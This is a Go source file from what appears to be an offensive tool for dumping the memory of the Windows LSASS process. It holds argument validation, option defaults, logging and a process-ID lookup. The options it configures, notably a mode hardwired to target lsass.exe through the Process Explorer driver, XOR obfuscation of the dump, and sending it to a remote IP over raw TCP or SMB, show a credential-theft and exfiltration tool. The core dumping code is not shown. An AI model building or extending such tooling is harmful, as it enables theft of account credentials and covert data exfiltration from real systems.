package main

import (
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/process"
	"net"
	"path/filepath"
	"runtime"
	"strings"
)

func ValidateArguments() error {
	if *MODE != MODE_DUMP && *MODE != MODE_DECRYPT && *MODE != MODE_CLEANUP && *MODE != MODE_DOTHATLSASSTHING {
		return CreateError(errors.New("invalid mode [--mode]"))
	}
	if *HANDLEMODE != HANDLEMODE_PROCEXP && *HANDLEMODE != HANDLEMODE_DIRECT {
		return CreateError(errors.New("invalid handle mode [--handle]"))
	}
	if *DUMPMODE != DUMPMODE_LOCAL && *DUMPMODE != DUMPMODE_NETWORK {
		return CreateError(errors.New("invalid dump mode mode [--dumpmode]"))
	}
	if *NETWORKMODE != NETWORKMODE_RAW && *NETWORKMODE != NETWORKMODE_SMB {
		return CreateError(errors.New("invalid network mode [--network]"))
	}
	if *SERVICENAME == "" {
		return CreateError(errors.New("service name can not be empty [--service]"))
	}
	if *DUMPNAME == "" {
		return CreateError(errors.New("dump name can not be empty [--dumpname]"))
	}
	if *OBFKEY == "" {
		return CreateError(errors.New("XOR key can not be empty [--key]"))
	}
	if *TARGETPID == 0 && *TARGETPROCNAME == "" {
		return CreateError(errors.New("--pid or --name required"))
	}
	if *DUMPMODE == DUMPMODE_NETWORK {
		if *REMOTEIP == "" || net.ParseIP(*REMOTEIP) == nil {
			return CreateError(errors.New("invalid remote ip [--ip]"))
		}
		if *NETWORKMODE == NETWORKMODE_RAW {
			if *REMOTEPORT == 0 || *REMOTEPORT < 1 || *REMOTEPORT > 65535 {
				return CreateError(errors.New("invalid remote port [--port]"))
			}
		}
	}
	if !filepath.IsAbs(*DRIVERPATH) {
		if _, err := filepath.Abs(*DRIVERPATH); err != nil {
			return CreateError(errors.New("invalid dump path " + err.Error()))
		}
	}
	return nil
}

func FillArguments() {
	if *MODE == MODE_DOTHATLSASSTHING {
		*HANDLEMODE = HANDLEMODE_PROCEXP
		*TARGETPROCNAME = "lsass.exe"
		*TARGETPID = 0
	}
	if *NETWORKMODE == NETWORKMODE_SMB {
		*REMOTEPORT = 445
	}
	if !filepath.IsAbs(*DRIVERPATH) {
		*DRIVERPATH, _ = filepath.Abs(*DRIVERPATH)
	}
}

func LogStatus(message string, err error, success bool) {
	if *QUIET {
		return
	}
	if success {
		fmt.Println(fmt.Sprintf("[+] %s", message))
		return
	}
	if err != nil {
		fmt.Println(fmt.Sprintf("[-] %s. Error: %s", message, err.Error()))
		return
	}
	fmt.Println(fmt.Sprintf("[-] %s", message))
}

func CreateError(err error) error {
	if err == nil {
		return err
	}
	var callerName = "UnknownFunction"
	if info, _, _, ok := runtime.Caller(1); ok {
		details := runtime.FuncForPC(info)
		if details != nil {
			callerName = details.Name()
		}
	}
	callerNameSplit := strings.Split(callerName, ".")
	newErrorText := fmt.Sprintf("%s error: %s", callerNameSplit[len(callerNameSplit)-1], err.Error())
	return errors.New(newErrorText)
}

func GetProcessId(pid int, name string) int {
	if pid != 0 {
		return pid
	}
	processes, err := process.Processes()
	if err != nil {
		return 0
	}
	for _, each := range processes {
		if procName, err := each.Name(); err == nil && procName == name {
			return int(each.Pid)
		}
	}
	return 0
}
